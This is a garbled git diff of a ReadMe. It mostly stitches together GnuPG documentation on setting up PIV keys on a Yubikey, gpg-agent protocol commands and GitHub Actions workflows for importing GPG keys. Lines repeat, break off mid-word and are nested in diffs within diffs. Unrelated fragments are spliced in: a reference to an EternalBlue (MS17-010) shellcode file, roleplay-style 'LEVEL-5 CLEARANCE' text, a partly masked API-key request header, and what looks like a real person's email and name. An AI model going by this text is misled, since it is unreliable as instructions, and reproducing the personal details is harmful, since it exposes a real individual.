 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
+Key management ...: [none]

 keyref .....: PIV.9D
+keygrip +gpgsm --gen-key -o encr.crt

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 1 +What keysize do you want? (3072) 2048 +Requested keysize is 2048 bits +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 3 +Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> otto@example.net +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) y +These parameters are used:
Key-Type: RSA
Key-Length: 2048
Key-Usage: encrypt
Serial: random
Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
Name-Email: otto@example.net
+Proceed with creation? (y/N) +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpgsm: certificate created +Ready. +$ gpgsm --import encr.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 + +gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpg/card> writecert PIV.9D < encr.crt + +gpgsm --with-keygrip -k 6309304695z@gmail.com +Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB

 keyref .....: PIV.9D  (encr)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
   user id ..: <6309304695z@gmail.com>
+34798AAFE0A7565088101CC4AE31C5C8C74461CB.key + +$ gpgsm --learn +$ gpgsm --gen-key -o sign.crt +Please select what kind of key you want:

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 3 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 +Your selection? 3 +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 2 +Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> 6309304695z@gmail.com +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) +These parameters are used:
Key-Type: card:PIV.9C
Key-Length: 1024
Key-Usage: sign
Serial: random
Name-DN: CN=Signing key for yk-9074625,O=example,C=DE
Name-Email: 6309304695z@gmail.com
+Proceed with creation? (y/N) y +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED +gpgsm: certificate created +Ready. +$ gpgsm --import sign.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 + +‘gpgsm --learn’ +Digital signature’ key +gpg-card:010203040506070801020304050607080102030405060708 + +shellcode/eternalblue_sc_merge.py + +gpg/card> writecert PIV.9C < sign.crt on: push: branches: master @@ -26967,4 +27804,4 @@ curl -L \

-H "Accept: application/vnd.github+json"
diff --git a/ReadMe.md b/ReadMe.md index 9f10a05..2888fcd 100644 --- a/ReadMe.md +++ b/ReadMe.md @@ -1,3 +1,1210 @@ +diff --git a/ReadMe.md b/ReadMe.md +index 7278f80..41b298d 100644 +--- a/ReadMe.md ++++ b/ReadMe.md +@@ -709,7 +709,844 @@ Digital signature’ key

gpg-card:
gpg/card> writecert PIV.9C < sign.crt ++# MS17-010 ++# 000006 ++Reader ...........: 1050:0407:X:0 ++Card type ........: yubikey ++Card firmware ....: 5.1.2 ++Serial number ....: FF020001008A77C1 ++Application type .: PIV ++Version ..........: 1.0 ++Displayed s/n ....: yk-9074625 ++PIN usage policy .: app-pin ++PIN retry counter : - [verified] - ++PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E ++ keyref .....: PIV.9A (auth) ++ algorithm ..: nistp384 ++Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C ++ keyref .....: PIV.9E (auth) ++ algorithm ..: nistp256 ++Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED ++ keyref .....: PIV.9C (sign,cert) ++ algorithm ..: rsa2048 ++ used for ...: X.509 ++ user id ..: CN=Signing key for yk-9074625,O=example,C=DE ++ user id ..: <6309304695z@gmail.co ++ m> ++Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB ++ keyref .....: PIV.9D (encr) ++ algorithm ..: rsa2048 ++ used for ...: X.509 ++ user id ..: CN=Encryption key for yk-9074625,O=example,C=DE ++ user id ..: 6309304695z@gmail.com ++ PIV authentication’ key with ssh: ++ ++$ ssh-add -l ++384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA) ++ssh-add with the uppercase ‘-L ++$ gpgsm --learn ++$ gpg --full-gen-key ++Please select what kind of key you want: ++ (1) RSA and RSA (default) ++ (2) DSA and Elgamal ++ (3) DSA (sign only) ++ (4) RSA (sign only) ++ (14) Existing key from card ++Your selection? 14 ++Serial number of the card: FF020001008A77C1 ++Available keys: ++ (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) ++ (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) ++ (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign) ++ (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) ++Your selection? 3 ++Please specify how long the key should be valid. ++ 0 = key does not expire ++ = key expires in n days ++ w = key expires in n weeks ++ m = key expires in n months ++ y = key expires in n years ++Key is valid for? (0) ++Key does not expire at all ++Is this correct? (y/N) y ++ ++GnuPG needs to construct a user ID to identify your key. ++ ++Real name: keith bieszczat ++Email address: 6309304695z@gmail.com ++Comment: https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator ++You selected this USER-ID: ++ "6309304695z@gmail.com" ++ ++Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o ++gpg: key C3AFA9ED971BB365 marked as ultimately trusted ++gpg: revocation certificate stored as '[...]D971BB365.rev' ++public and secret key created and signed. ++ ++Note that this key cannot be used for encryption. You may want to use ++the command "--edit-key" to generate a subkey for this purpose. ++pub rsa2048 2019-04-04 [SC] ++ 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 ++uid 6309304695z@gmail.com ++ ++ run gpg in --expert mode ++ $ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 ++Secret key is available. ++ ++sec rsa2048/C3AFA9ED971BB365 ++ created: 2019-04-04 expires: never usage: SC ++ card-no: FF020001008A77C1 ++ trust: ultimate validity: ultimate ++[ultimate] (1). otto@example.net ++gpg> addkey ++Secret parts of primary key are stored on-card. ++Please select what kind of key you want: ++ (3) DSA (sign only) ++ (4) RSA (sign only) ++ (5) Elgamal (encrypt only) ++ (6) RSA (encrypt only) ++ (14) Existing key from card ++Your selection? 14 ++Serial number of the card: FF020001008A77C1 ++Available keys: ++ (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) ++ (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) ++ (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign) ++ (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) ++Your selection? 4 ++Please specify how long the key should be valid. ++ 0 = key does not expire ++ = key expires in n days ++ w = key expires in n weeks ++ m = key expires in n months ++ y = key expires in n years ++Key is valid for? (0) ++Key does not expire at all ++Is this correct? (y/N) y ++Really create? (y/N) y ++ ++sec rsa2048/C3AFA9ED971BB365 ++ created: 2019-04-04 expires: never usage: SC ++ card-no: FF020001008A77C1 ++ trust: ultimate validity: ultimate ++ssb rsa2048/7067860A98FCE6E1 ++ created: 2019-04-04 expires: never usage: E ++ card-no: FF020001008A77C1 ++[ultimate] (1). otto@example.net ++ ++gpg> save ++ ++/* 32A19-D90712
++LEVEL-5 CLEARANCE ONLY ++ ‘--force’ ++authentication key ++-header-'010203040506070801020304050607080102030405060708' ++SETDATA hexstring ++to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command ++ ++ PKSIGN keyid ++where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like: ++ ++ PKSIGN --hash=algoname keyid ++READKEY hexified_certid ++READCERT hexified_certid|keyid ++SERIALNO ++Return the serial number of the card using a status response like: ++ ++ S SERIALNO D27600000000000000000000 ++ WRITEKEY [--force] keyid ++SETDATA hexstring ++to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command ++ ++ PKDECRYPT keyid ++CHECKPIN idstr ++RESTART ++APDU [--atr] [--more] [--exlen[=n]] [hexstring] ++S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1 ++ ++./configure --sysconfdir=/etc --localstatedir=/va ++CN=Wurzel ZS 3,O=Intevation GmbH,C=DE ++ A6935DD34EF3087973C706FC311AA2CCF733765B S ++ ++ # CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE ++ DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S ++ ++ # CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE ++ !14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S ++
++ # Key added on: 2011-07-20 20:38:46 ++ # Fingerprint: 5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81 ++ 34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm ++private-keys-v1.d/ ++gpg-connect-agent 'help COMMAND' /bye ++SETKEY ++Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available. ++ ++ PKDECRYPT ++The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text. ++ ++ S: INQUIRE CIPHERTEXT ++ C: D (xxxxxx ++ C: D xxxx) ++ C: END ++Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure: ++ ++ (enc-val ++ ( ++ (<param_name1> ) ++ ... ++ (<param_namen> ))) ++Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency. ++ ++If the decryption was successful the decrypted data is returned by means of "D" lines. ++ ++Here is an example session: ++ ++ C: PKDECRYPT ++ S: INQUIRE CIPHERTEXT ++ C: D (enc-val elg (a 349324324) ++ C: D (b 3F444677CA))) ++ C: END ++ S: # session key follows ++ S: S PADDING 0 ++ S: D (value 1234567890ABCDEF0) ++ S: OK decryption successful ++The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has ++SIGKEY ++This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay. ++ ++ SETHASH --hash=| ++sig-val ++ ( ++ (<param_name1> ) ++ ... ++ (<param_namen> ))) ++The operation is affected by the option ++ ++ OPTION use-cache-for-signing=0|1 ++The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching. ++ ++Here is an example session: ++ ++ C: SIGKEY ++ S: OK key available ++ C: SIGKEY ++ S: OK key available ++ C: PKSIGN ++ S: # I did ask the user whether he really wants to sign ++ S: # I did ask the user for the passphrase ++ S: INQUIRE HASHVAL ++ C: D ABCDEF012345678901234 ++ C: END ++ S: # signature follows ++ S: D (sig-val rsa (s 45435453654612121212)) ++ S: OK ++ GENKEY [--no-protection] [--preset] [<cache_nonce>] ++Invokes the key generation process and the server will then inquire on the generation parameters, like: ++ ++ S: INQUIRE KEYPARM ++ C: D (genkey (rsa (nbits 1024))) ++ C: END ++The format of the key parameters which depends on the algorithm is of the form: ++ ++ (genkey ++ (algo ++ (parameter_name_1 ....) ++ .... ++ (parameter_name_n ....))) ++If everything succeeds, the server returns the public key in a SPKI like S-Expression like this: ++ ++ (public-key ++ (rsa ++ (n ) ++ (e ))) ++Here is an example session: ++ ++ C: GENKEY ++ S: INQUIRE KEYPARM ++ C: D (genkey (rsa (nbits 1024))) ++ C: END ++ S: D (public-key ++ S: D (rsa (n 326487324683264) (e 10001))) ++ S OK key created ++ ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81> ++LISTTRUSTED ++GpgAgent returns a list of trusted keys line by line: ++ ++ S: D 000000001234454556565656677878AF2F1ECCFF P ++ S: D 340387563485634856435645634856438576457A P ++ S: D FEDC6532453745367FD83474357495743757435D S ++ S: OK ++The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future. ++Ok ++Finally a client should be able to mark a key as trusted: ++ ++ MARKTRUSTED fingerprint "P"|"S" ++The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this: ++ ++ S: INQUIRE TRUSTDESC ++ C: D Do you trust the key with the fingerprint @FPR@ ++ C: D bla fasel blurb. ++ C: END ++ S: OK ++GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]]
++ [--qualitybar] cache_id
++ [error_message prompt description] ++PRESET_PASSPHRASE [--inquire] <string_or_keygrip> [] ++ ++HAVEKEY keygrips ++ GET_CONFIRMATION description ++ LEARN [--send] ++UPDATESTARTUPTTY ++SETDATA hexstring ++ ++ ++ PKSIGN keyid ++ ++ ++ PKSIGN --hash=algoname keyid ++ ++READCERT hexified_certid|keyid ++READKEY hexified_certid ++SETDATA hexstring ++d ++ ++ PKSIGN keyid ++ LEARN ++ ++ PKSIGN --hash=algoname keyid ++ ++WRITEKEY [--force] keyid ++WRITEKEY [--force] keyid ++PASSWD [--reset] [--nullpin] chvno ++CHECKPIN idstr ++APDU [--atr] [--more] [--exlen[=n]] [hexstring] ++this: ++ ++ S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1 ++--auto-key-import ++ ++command --locate-external-key ++command --locate-external-key ++github/workflows/release.yml: ++ldap://keys.(thedomain) ++‘--auto-key-locate ++ --auto-key-locate ++--auto-key-retrieve ++ ++ ++ honor-keyserver-url ++ ++-sig-keyserver-url ++--recv-key ++honor-keyserver-url ++--use-agent ++--gpg-agent-info ++ ++ ++--no-random-seed-file ++Host: c7-use-3.algolianet. com ++Accept: / ++Sec-Fetch-Site: cross-site ++Accept-Language: en-US, en; q=0.9 ++Accept-Encoding: gzip, deflate, br ++Sec-Fetch-Mode: cors x-algolia-application-id: A7KCVJZ91B ++Origin: https://dashboard.algolia.com ++User-Agent: Mozilla/5.0 (iPhone; CPU iPhone 0S 17_3 like Mac 0S X) AppleWe ++x-algolia-api-key: b3cf***********************米** ++Content-Length: 27 ++Connection: keep-alive ++Content-Type: application/x-www-form-urlencoded ++Sec-Fetch-Dest: empty ++ ++scdaemon.conf ++1 ++HKCU\Software\GNU\GnuPG:DefaultLogFile, ++--debug-level level ++HKCU\Software\GNU\GnuPG:DefaultLogFile, ++scd-event ++HKCU\Software\GNU\GnuPG:HomeDir ++HKCU\Software\GNU\GnuPG:DefaultLogFile, ++reader_n.status ++HKCU\Software\GNU\GnuPG:HomeDir ++ ++trustlist.txt file ++gpg-agent.conf ++HKCU\Software\GNU\GnuPG:HomeDir ++name: release ++debug-pinentry ++--debug 1024 ++ ++global trustlist (/usr/local/etc/gnupg/trustlist.tx ++ ++Active cards ++Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers. ++gpg-connect-agent updatestartuptty /bye ++Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command: ++ ++gpg-connect-agent /bye ++--scdaemon-program filename ++Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf ++--check-passphrase-pattern file ++--check-sym-passphrase-pattern file ++Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg) ++bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe ++Keys listed in the sshcontrol file ++--disable-extended-key-format ++These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched. ++ ++--enable-ssh-support ++--enable-win32-openssh-support ++--enable-putty-support ++ ++gpg-connect-agent 'GETINFO s2k_count' /bye ++gpg-connect-agent 'GETINFO s2k_time' /bye ++To view the auto-calibrated count use: ++ ++gpg-connect-agent 'GETINFO s2k_count_cal' /bye ++--ssh-fingerprint-digest ++Keys listed in the sshcontrol file ++ ++Active card ++gpg-connect-agent /bye ++bashrc or whatever initialization file is used for all shell invocations: ++ ++GPG_TTY=$(tty) ++export GPG_TTY ++--daemon [command line] ++server ++ ++agent-program file ¶ ++Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs. ++ ++--gpg-program file ++Specify a non-default gpg binary to be used by certain commands. ++ ++--gpgsm-program file ++Specify a non-default gpgsm binary to be used by certain commands. ++ ++--chuid uid ++Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows. ++ ++gpg-card ++AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶ ++AUTH ++FETCH ++GENERATE [--force] [--algo=algo{+algo2}] keyref ++KDF-SETUP ¶ ++Prepare the OpenPGP card KDF feature for this card. ++ ++LANG [--clear] ++Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info. ++ ++LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] ++NAME [--clear] ++PRIVATEDO [--clear] n [< file] file ++READCERT [--openpgp] certref > file ¶ ++Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3". ++URL [--clear] ++gpg's. --fetch ++WRITECERT certref < file ¶ ++WRITECERT --openpgp certref [< file|fpr] ++WRITECERT --clear certref ++ --openpgp ++file ++fpr. ++WRITEKEY [--force] keyref keygrip ¶ ++Write a private key object identified by keygrip to the card under the id keyref. ++CHECKKEYS [--ondisk] [--delete-clear-copy] [--delete-protected-copy] ¶ ++Serial number ++A hex-string with the serial number of the card. ++ ++Type ++This gives the type of the card’s application. For example "OpenPGP" or "PIV". ++ ++Keygrip ++A hex-string identifying a key. ++ ++Keyref ++The application slot where the key is stored on the card. For example "OpenPGP.1" ++ ++Status ++The status of the key. The most common value is "shadowed" for a key where only the public key along with the card’s serial number is stored on the disk. The value "clear" indicates that a copy of the card’s key is stored unprotected on disk. The value "protected" indicated that a copy of the car’s key is stored on disk but is protected by a password. The value "error" may also be shown if there was a problem reading information from the card. ++ ++YUBIKEY cmd args ++Various commands pertaining to Yubikey tokens with cmd being: ++ ++LIST ++List supported and enabled Yubikey applications. ++ ++ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] ++DISABLE ++Enable or disable the specified or all applications on the given interface. ++ ++The support for OpenPGP cards in gpg-card is not yet complete. For missing features, please continue to use gpg --card-edit. ++ ++GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are: ++ ++Authentication key ++This is a 24 byte key described by the hex string ++010203040506070801020304050607080102030405060708. ++ ++PIV Application PIN ++This is the string 123456. ++ ++PIN Unblocking Key ++This is the string 12345678. ++list (the string gpg/card> ++card> list ++Reader ...........: 1050:0407:X:0 ++Card type ........: yubikey ++Card firmware ....: 5.1.2 ++Serial number ....: D2760001240102010006090746250000 ++Application type .: OpenPGP ++Version ..........: 2.1 ++[...] ++on: ++ push: ++ tags: ++ - "v" ++ ++permissions: ++ contents: write ++ ++jobs: ++ release: ++ runs-on: ubuntu-latest ++ steps: ++ - uses: actions/checkout@v3 ++ - uses: cli/gh-extension-precompile@v1 ++ with: ++ go_version: "1.16" ++Then ++- uses: cli/gh-extension-precompile@v1 ++ env: ++ CGO_ENABLED: 1 ++- uses: cli/gh-extension-precompile@v1 ++ with: ++ build_script_override: "script/build.sh" ++name: release ++ ++on: ++ push: ++ tags: ++ - "v" ++ ++permissions: ++ contents: write ++ ++jobs: ++ release: ++ runs-on: ubuntu-latest ++ steps: ++ - uses: actions/checkout@v3 ++ - id: import_gpg ++ uses: crazy-max/ghaction-import-gpg@v5 ++ with: ++ gpg_private_key: {{ secrets.GPG_PASSPHRASE }} ++ - uses: cli/gh-extension-precompile@v1 ++ with: ++ gpg_fingerprint: ${{ steps.import_gpg.outputs.fingerprint }} ++# macOS ++gpg --armor --export-secret-key joe@foo.bar | pbcopy ++ ++# Ubuntu (assuming GNU base64) ++gpg --armor --export-secret-key joe@foo.bar -w0 | xclip ++ ++# Arch ++gpg --armor --export-secret-key joe@foo.bar | xclip -selection clipboard -i ++ ++# FreeBSD (assuming BSD base64) ++gpg --armor --export-secret-key joe@foo.bar | xclip ++ ++name: import-gpg ++ ++on: ++ push: ++ branches: master ++ ++jobs: ++ import-gpg: ++ runs-on: ubuntu-latest ++ steps: ++ - ++ name: Checkout ++ uses: actions/checkout@v4 ++ - ++ name: Import GPG key ++ uses: crazy-max/ghaction-import-gpg@v6 ++ with: ++ gpg_private_key: {{ secrets.PASSPHRASE }} ++ - ++ name: List keys ++ run: gpg -K ++name: import-gpg ++ ++on: ++ push: ++ branches: master
++gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB ++gpg/card> writecert PIV.9D < encr.crt ++ ++jobs: ++ import-gpg: ++ runs-on: ubuntu-latest ++ steps: ++ - ++ name: Checkout ++ uses: actions/checkout@v4 ++ - ++ name: Import GPG key ++ uses: crazy-max/ghaction-import-gpg@v6 ++ with: ++ gpg_private_key: {{ secrets.PASSPHRASE }} ++ fingerprint: "C17D11ADF199F12A30A0910F1F80449BE0B08CB8" ++ - ++ name: List keys ++ run: gpg -K ++ ++pub ed25519 2021-09-24 [C] ++ 87F257B89CE462100BEC0FFE6071D218380FDCC8 ++ Keygrip = F5C3ABFAAB36B427FD98C4EDD0387E08EA1E8092 ++uid [ unknown] Joe Bar joe@bar.foo ++sub ed25519 2021-09-24 [S] ++ C17D11ADF199F12A30A0910F1F80449BE0B08CB8 ++ Keygrip = DEE0FC98F441519CA5DE5D79773CB29009695FEB ++name: import-gpg ++/.gnupg/scdaemon.conf and by restarting scdaemon, either by killing the process or by using gpgconf --kill scdaemon. Finally the default order in which card applications are tried by scdaemon can be changed. For example to prefer PIV over OpenPGP it is sufficient to add ++ ++application-priority piv ++to ~/.gnupg/scdaemon.conf and to restart scdaemon. This has an effect only on tokens which support both, PIV and OpenPGP, but does not hamper the use of OpenPGP only tokens. ++ ++With one of these methods employed the list command of gpg-card shows this: ++ ++gpg/card> list ++Reader ...........: 1050:0407:X:0 ++Card type ........: yubikey ++Card firmware ....: 5.1.2 ++Serial number ....: FF020001008A77C1 ++Application type .: PIV ++Version ..........: 1.0 ++Displayed s/n ....: yk-9074625 ++PIN usage policy .: app-pin ++PIN retry counter : - 3 - ++PIV authentication: [none] ++ keyref .....: PIV.9A ++Card authenticat. : [none] ++ keyref .....: PIV.9E ++Digital signature : [none] ++ keyref .....: PIV.9C ++Key management ...: [none] ++ keyref .....: PIV.9D ++34798AAFE0A7565088101CC4AE31C5C8C74461CB.key ++list --cards ++well. The PIV authentication key (internal reference PIV.9A ++Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) is used for encryption ++ ++gpg/card> auth 010203040506070801020304050607080102030405060708 ++gpg/card> auth < myauth.key ++ ++gpg/card> generate --algo=nistp384 PIV.9A ++PIV card no. yk-9074625 detected ++gpg/card> generate --algo=nistp256 PIV.9E ++PIV card no. yk-9074625 detected ++gpg/card> generate --algo=rsa2048 PIV.9C ++PIV card no. yk-9074625 detected ++ ‘--force’ ++gpg/card> list ++Reader ...........: 1050:0407:X:0 ++Card type ........: yubikey ++Card firmware ....: 5.1.2 ++Serial number ....: FF020001008A77C1 ++Application type .: PIV ++Version ..........: 1.0 ++Displayed s/n ....: yk-9074625 ++PIN usage policy .: app-pin ++PIN retry counter : - 3 - ++PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E ++ keyref .....: PIV.9A (auth) ++ algorithm ..: nistp384 ++Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C ++ keyref .....: PIV.9E (auth) ++ algorithm ..: nistp256 ++Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED ++ keyref .....: PIV.9C (sign,cert) ++ algorithm ..: rsa2048 ++Key management ...: [none] ++ keyref .....: PIV.9D ++keygrip ++gpg ++self-signed X.509 certificate (exit the gpg-card tool, first): ++ ++$ gpgsm --gen-key -o encr.crt ++ (1) RSA ++ (2) Existing key ++ (3) Existing key from card ++Your selection? 1 ++What keysize do you want? (3072) 2048 ++Requested keysize is 2048 bits ++Possible actions for a RSA key: ++ (1) sign, encrypt ++ (2) sign ++ (3) encrypt ++Your selection? 3 ++Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE ++Enter email addresses (end with an empty line): ++> otto@example.net ++> ++Enter DNS names (optional; end with an empty line): ++> ++Enter URIs (optional; end with an empty line): ++> ++Create self-signed certificate? (y/N) y ++These parameters are used: ++ Key-Type: RSA ++ Key-Length: 2048 ++ Key-Usage: encrypt ++ Serial: random ++ Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE ++ Name-Email: otto@example.net ++ ++Proceed with creation? (y/N) ++Now creating self-signed certificate. This may take a while ... ++gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB ++gpgsm: certificate created ++Ready. ++$ gpgsm --import encr.crt ++gpgsm: certificate imported ++gpgsm: total number processed: 1 ++gpgsm: imported: 1 ++gpg/card> list ++Reader ...........: 1050:0407:X:0 ++Card type ........: yubikey ++Card firmware ....: 5.1.2 ++Serial number ....: FF020001008A77C1 ++Application type .: PIV ++Version ..........: 1.0 ++Displayed s/n ....: yk-9074625 ++PIN usage policy .: app-pin ++PIN retry counter : - 3 - ++PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E ++ keyref .....: PIV.9A (auth) ++ algorithm ..: nistp384 ++Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C ++ keyref .....: PIV.9E (auth) ++ algorithm ..: nistp256 ++Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED ++ keyref .....: PIV.9C (sign,cert) ++ algorithm ..: rsa2048 ++Key management ...: [none] ++ keyref .....: PIV.9D ++keygrip ++gpgsm --gen-key -o encr.crt ++ (1) RSA ++ (2) Existing key ++ (3) Existing key from card ++Your selection? 1 ++What keysize do you want? (3072) 2048 ++Requested keysize is 2048 bits ++Possible actions for a RSA key: ++ (1) sign, encrypt ++ (2) sign ++ (3) encrypt ++Your selection? 3 ++Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE ++Enter email addresses (end with an empty line): ++> otto@example.net ++> ++Enter DNS names (optional; end with an empty line): ++> ++Enter URIs (optional; end with an empty line): ++> ++Create self-signed certificate? (y/N) y ++These parameters are used: ++ Key-Type: RSA ++ Key-Length: 2048 ++ Key-Usage: encrypt ++ Serial: random ++ Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE ++ Name-Email: otto@example.net ++ ++Proceed with creation? (y/N) ++Now creating self-signed certificate. This may take a while ... ++gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB ++gpgsm: certificate created ++Ready. ++$ gpgsm --import encr.crt ++gpgsm: certificate imported ++gpgsm: total number processed: 1 ++gpgsm: imported: 1 ++ ++gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB ++gpg/card> writecert PIV.9D < encr.crt ++ ++gpgsm --with-keygrip -k 6309304695z@gmail.com ++Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB ++ keyref .....: PIV.9D (encr) ++ algorithm 